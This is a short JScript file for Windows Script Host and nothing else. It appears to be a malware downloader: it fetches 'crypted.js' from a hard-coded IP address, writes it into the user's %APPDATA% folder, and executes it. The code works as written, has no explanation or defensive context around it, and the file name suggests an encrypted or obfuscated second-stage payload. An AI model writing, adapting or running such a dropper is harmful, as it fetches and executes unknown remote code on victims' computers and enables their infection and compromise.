var url = 'http://188.132.130.233/crypted.js';
var fileName = 'crypted.js';

var downloadUrl = new ActiveXObject('Msxml2.XMLHTTP');
downloadUrl.open('GET', url, false);
downloadUrl.send();

if (downloadUrl.Status === 200) {
  var shell = new ActiveXObject('WScript.Shell');
  var appDataFolder = shell.ExpandEnvironmentStrings('%APPDATA%');
  var filePath = appDataFolder + '\\' + fileName;
  
  var file = downloadUrl.ResponseBody;
  var stream = new ActiveXObject('ADODB.Stream');
  stream.Type = 1;
  stream.Open();
  stream.Write(file);
  stream.SaveToFile(filePath);
  stream.Close();
  
  
  shell.Run(filePath, 1, true); // Run the downloaded file
} else {
  WScript.echo('Download failed');
}